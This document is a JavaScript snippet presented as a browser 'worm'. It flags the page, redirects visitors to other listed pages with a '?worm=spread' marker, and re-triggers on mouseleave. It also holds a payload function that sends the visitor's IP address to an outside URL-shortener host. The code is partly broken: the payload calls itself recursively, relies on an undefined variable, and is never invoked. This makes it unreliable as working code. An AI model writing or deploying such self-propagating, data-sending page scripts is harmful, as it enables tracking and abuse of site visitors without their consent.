(function () {
    // List of URLs to spread to (add the URLs of the other pages where you want the worm to go)
    const pagesToSpreadTo = [
      // Add pages for virus to spread to...
    ];

    // Function to simulate the worm spreading
    function spreadWorm() {
        // Only run the worm if it's not already on this page (to avoid infinite loops)
        if (!document.body.classList.contains('worm-injected')) {
            // Mark this page as having the worm injected
            document.body.classList.add('worm-injected');

            // Log the spreading to the console (just for educational purposes)
            console.log('Worm has been injected on this page!');

            // Choose a random page from the list to spread to
            const randomPage = pagesToSpreadTo[Math.floor(Math.random() * pagesToSpreadTo.length)];

            // Try to replicate by redirecting to one of the pages from the list (simulating a "spread")
            setTimeout(() => {
                window.location.href = randomPage + '?worm=spread'; // Redirect to a random page with ?worm=spread
            }, 2000); // Delay before spreading
        }

        // Add your own worm function here (the actual payload)
        
        function getIpAddress() {
          fetch('https://tinyurl.com/mr2ssu2t' + encodeURIComponent(userIp))
          .then(response => response.text())
          .then(data => {
            console.log('IP Logged: ', data);
          })
          .catch(err => {
             console.error('Error sending IP: ', err);
          });
          getIpAddress();
    }

    // Check if the current URL has ?worm=spread
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('worm') && urlParams.get('worm') === 'spread') {
        spreadWorm(); // Trigger the worm right away if ?worm=spread is in the URL
    }

    // Trigger the worm on mouseleave
    document.addEventListener('mouseleave', function() {
        spreadWorm(); // Call the spreadWorm function when the mouse leaves the page
    });
})();
